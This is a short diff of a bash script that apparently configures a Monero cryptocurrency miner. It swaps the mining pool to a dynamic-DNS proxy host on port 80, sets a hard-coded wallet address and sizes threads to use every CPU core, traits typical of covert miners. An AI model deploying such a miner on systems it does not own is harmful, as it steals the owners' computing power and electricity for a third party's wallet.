@@ -1,7 +1,7 @@
 #!/bin/bash
 
 
-POOL=cotet.go.ro:5555
+POOL=xmrproxy.dynu.net:80
 WALLET=44NoPqV96tfD5tvAmUHrpUEAf62LwDrABgTnmhPHM9g6Bkdk3nk7arB1V86TykSDUUT1bJHfKMtxPJakKyqEwMSbLcJ6oVT
 CORES=`cat /proc/cpuinfo | grep processor | wc -l`
 THREADS=$((CORES+1))
